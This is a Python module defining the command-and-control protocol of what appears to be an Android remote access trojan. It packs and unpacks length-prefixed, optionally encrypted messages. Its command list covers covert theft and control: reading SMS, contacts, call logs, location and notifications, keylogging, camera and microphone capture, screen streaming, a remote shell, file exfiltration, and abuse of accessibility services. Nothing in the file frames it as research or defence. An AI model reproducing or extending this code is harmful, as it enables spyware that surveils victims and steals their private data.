import json
import uuid
import struct
from typing import Optional


class Protocol:
    TYPE_HANDSHAKE = "handshake"
    TYPE_HEARTBEAT = "heartbeat"
    TYPE_COMMAND = "command"
    TYPE_RESPONSE = "response"
    TYPE_STREAM = "stream"
    TYPE_SHELL_IO = "shell_io"
    TYPE_DISCONNECT = "disconnect"
    TYPE_KEYLOG = "keylog"
    TYPE_SCREEN_FRAME = "screen_frame"
    TYPE_NOTIFICATION = "notification_data"

    CMD_DEVICE_INFO = "deviceInfo"
    CMD_CAM_LIST = "camList"
    CMD_TAKE_PIC = "takepic"
    CMD_START_VIDEO = "startVideo"
    CMD_STOP_VIDEO = "stopVideo"
    CMD_START_AUDIO = "startAudio"
    CMD_STOP_AUDIO = "stopAudio"
    CMD_GET_SMS = "getSMS"
    CMD_GET_CALL_LOGS = "getCallLogs"
    CMD_GET_LOCATION = "getLocation"
    CMD_GET_CONTACTS = "getContacts"
    CMD_GET_IP = "getIP"
    CMD_GET_MAC = "getMACAddress"
    CMD_GET_SIM = "getSimDetails"
    CMD_GET_CLIPBOARD = "getClipData"
    CMD_GET_APPS = "getInstalledApps"
    CMD_GET_BATTERY = "getBatteryStatus"
    CMD_GET_WIFI = "getWifiInfo"
    CMD_SCREENSHOT = "screenshot"
    CMD_SHELL = "shell"
    CMD_SHELL_CMD = "shellCmd"
    CMD_SHELL_EXIT = "shellExit"
    CMD_VIBRATE = "vibrate"
    CMD_OPEN_URL = "openUrl"
    CMD_SEND_SMS = "sendSMS"
    CMD_SHOW_TOAST = "showToast"
    CMD_LOCK_SCREEN = "lockScreen"
    CMD_GET_NOTIFICATIONS = "getNotifications"
    CMD_FILE_DOWNLOAD = "fileDownload"
    CMD_FILE_UPLOAD = "fileUpload"
    CMD_FILE_LIST = "fileList"
    CMD_FILE_DELETE = "fileDelete"
    CMD_START_KEYLOGGER = "startKeylogger"
    CMD_STOP_KEYLOGGER = "stopKeylogger"
    CMD_READ_SCREEN = "readScreen"
    CMD_PERFORM_ACTION = "performAction"
    CMD_CHECK_ACCESSIBILITY = "checkAccessibility"
    CMD_ENABLE_ACCESSIBILITY = "enableAccessibility"
    CMD_START_SCREEN_STREAM = "startScreenStream"
    CMD_STOP_SCREEN_STREAM = "stopScreenStream"
    CMD_MAKE_CALL = "makeCall"

    @staticmethod
    def create_command(cmd: str, args: dict = None) -> dict:
        return {
            "type": Protocol.TYPE_COMMAND,
            "id": str(uuid.uuid4()),
            "cmd": cmd,
            "args": args or {}
        }

    @staticmethod
    def create_response(cmd_id: str, status: str, data: dict = None, device_id: str = "") -> dict:
        return {
            "type": Protocol.TYPE_RESPONSE,
            "id": cmd_id,
            "status": status,
            "data": data or {},
            "device_id": device_id
        }

    @staticmethod
    def create_heartbeat(device_id: str, info: dict) -> dict:
        return {
            "type": Protocol.TYPE_HEARTBEAT,
            "device_id": device_id,
            "info": info
        }

    @staticmethod
    def create_handshake(device_id: str, model: str, android_version: str, key_hash: str) -> dict:
        return {
            "type": Protocol.TYPE_HANDSHAKE,
            "device_id": device_id,
            "model": model,
            "android_version": android_version,
            "key_hash": key_hash
        }

    @staticmethod
    def create_stream(cmd_id: str, filename: str, data_b64: str, device_id: str = "") -> dict:
        return {
            "type": Protocol.TYPE_STREAM,
            "id": cmd_id,
            "filename": filename,
            "data": data_b64,
            "device_id": device_id
        }

    @staticmethod
    def pack_message(message: dict, crypto=None) -> bytes:
        json_str = json.dumps(message, ensure_ascii=False)
        if crypto:
            payload = crypto.encrypt(json_str).encode("utf-8")
        else:
            payload = json_str.encode("utf-8")
        return struct.pack(">I", len(payload)) + payload

    @staticmethod
    def unpack_message(data: bytes, crypto=None) -> Optional[dict]:
        try:
            payload_str = data.decode("utf-8")
            if crypto:
                payload_str = crypto.decrypt(payload_str)
            return json.loads(payload_str)
        except (json.JSONDecodeError, UnicodeDecodeError, ValueError):
            return None
